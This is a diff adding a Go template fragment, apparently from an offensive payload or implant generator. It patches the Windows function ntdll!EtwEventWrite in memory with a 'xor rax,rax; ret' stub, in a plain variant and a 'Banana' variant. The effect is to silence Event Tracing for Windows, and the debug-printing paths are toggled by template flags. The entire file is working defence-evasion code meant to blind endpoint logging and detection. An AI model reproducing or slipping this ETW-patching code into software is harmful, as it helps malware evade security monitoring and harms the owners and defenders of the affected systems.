@@ -1,0 +1,31 @@
+{{if eq .UseBanana "true"}}
+out_{{ .SubName }}, err_{{ .SubName }} := patchBanana_{{ .SubName }}("ntdll.dll", "EtwEventWrite", &[]byte{0x48, 0x33, 0xC0, 0xC3})
+{{ if not .Debug }}
+_ = out_{{ .SubName }}
+{{end}}
+if  err_{{ .SubName }} != nil {
+    {{if .Debug}}
+	printDebug("error","There was an error patching the ntdll!EtwEvenWrite function with Banana: %s", err_{{ .SubName }})
+    printDebug("info","Error while patching... continue")
+    {{end}}
+} else {
+    {{if .Debug}}
+    printDebug("info", out_{{ .SubName }})
+    {{end}}
+}
+{{ else }}
+out_{{ .SubName }}, err_{{ .SubName }} := patch_{{ .SubName }}("ntdll.dll", "EtwEventWrite", &[]byte{0x48, 0x33, 0xC0, 0xC3})
+{{ if not .Debug }}
+_ = out_{{ .SubName }}
+{{end}}
+if  err_{{ .SubName }} != nil {
+    {{if .Debug}}
+	printDebug("error","There was an error patching the ntdll!EtwEvenWrite function: %s", err_{{ .SubName }})
+    printDebug("info","Error while patching... continue")
+    {{end}}
+} else {
+    {{if .Debug}}
+    printDebug("info", out_{{ .SubName }})
+    {{end}}
+}
+{{ end }}
